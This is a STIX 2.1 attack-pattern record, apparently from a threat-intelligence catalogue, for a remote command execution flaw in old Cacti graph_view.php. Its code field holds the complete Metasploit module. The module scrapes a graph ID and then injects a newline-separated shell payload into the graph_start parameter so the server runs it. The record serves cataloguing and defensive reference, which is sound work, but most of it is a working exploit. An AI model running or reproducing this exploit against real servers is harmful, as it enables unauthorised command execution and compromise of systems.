{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b1043be8-2cb6-44ef-be0b-3c845467cb07",
    "created": "2024-08-14T17:13:16.820489Z",
    "modified": "2024-08-14T17:13:16.820493Z",
    "name": "Cacti graph_view.php Remote Command Execution",
    "description": " This module exploits an arbitrary command execution vulnerability in the Raxnet Cacti 'graph_view.php' script. All versions of Raxnet Cacti prior to 0.8.6-d are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/cacti_graphimage_exec.rb",
            "external_id": "cacti_graphimage_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cacti graph_view.php Remote Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution vulnerability in the\n        Raxnet Cacti 'graph_view.php' script. All versions of Raxnet Cacti prior to\n        0.8.6-d are vulnerable.\n      },\n      'Author'         => [ 'David Maciejak <david.maciejak[at]kyxar.fr>', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '17539' ],\n          [ 'BID', '14042' ],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 512,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby python telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2005-01-15',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The full URI path to graph_view.php\", \"/cacti/graph_view.php\"]),\n      ])\n  end\n\n  def exploit\n    # Obtain a valid image ID\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'vars_get' =>\n        {\n          'action' => 'list'\n        }\n      }, 10)\n\n    if (not res)\n      print_error(\"The server gave no response\")\n      return\n    end\n\n    m = res.body.match(/local_graph_id=(.*?)&/)\n    if (not m)\n      print_error(\"Could not locate a valid image ID\")\n      return\n    end\n\n    # Trigger the command execution bug\n    res = send_request_cgi({\n      'uri'      => normalize_uri(datastore['URI']),\n      'vars_get' =>\n        {\n          'local_graph_id' => m[1],\n          'graph_start'    => \"\\necho YYY;#{payload.encoded};echo YYY;echo\\n\"\n        }\n      }, 25)\n\n    if (res)\n      print_status(\"The server returned: #{res.code} #{res.message}\")\n      print(\"\")\n\n      m = res.body.match(/YYY(.*)YYY/)\n\n      if (m)\n        print_status(\"Command output from the server:\")\n        print(m[1])\n      else\n        print_status(\"This server may not be vulnerable\")\n      end\n\n    else\n      print_status(\"No response from the server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2005-01-15",
    "x_mitre_platforms": [
        "unix'"
    ]
}